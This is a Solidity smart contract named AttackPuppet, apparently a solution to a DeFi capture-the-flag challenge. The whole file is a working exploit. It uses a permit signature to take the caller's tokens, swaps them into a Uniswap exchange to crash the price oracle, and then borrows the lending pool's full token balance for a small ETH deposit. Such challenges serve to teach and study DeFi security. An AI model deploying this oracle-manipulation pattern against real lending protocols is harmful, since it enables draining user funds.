// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AttackPuppet
 * @author Kornel Światłowski
 */
 interface PuppetPoolInterface {
    function borrow(uint256 amount, address recipient) external payable;
    function calculateDepositRequired(uint256 amount) external view returns(uint256);
}
 interface UniswapExchangeInterface {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256  eth_bought);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address to) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}
contract AttackPuppet {
    IERC20 public immutable token;

    constructor(
        address tokenAddress, 
        UniswapExchangeInterface uniswap,
        PuppetPoolInterface puppetPool, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
        ) payable {
        token = IERC20(tokenAddress);
        uint256 initialAttackerDVTBalance = token.balanceOf(msg.sender);
        //permint needed to satisfy 1 tx check
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(msg.sender, address(this), initialAttackerDVTBalance);
        token.approve(address(uniswap), initialAttackerDVTBalance);

        uint256 deadline = block.timestamp * 2;
        // Amount to borrow is calclated based on balances of ETH and ERC20 token
        // by swapin we change rate to our favor
        uniswap.tokenToEthSwapInput(999*10**18, 1, deadline);

        uint256 amountERCToDrain = token.balanceOf(address(puppetPool));
        uint256 amountEthNeededToDrain = puppetPool.calculateDepositRequired(amountERCToDrain);
        puppetPool.borrow{value:amountEthNeededToDrain}(amountERCToDrain, msg.sender);
    }
}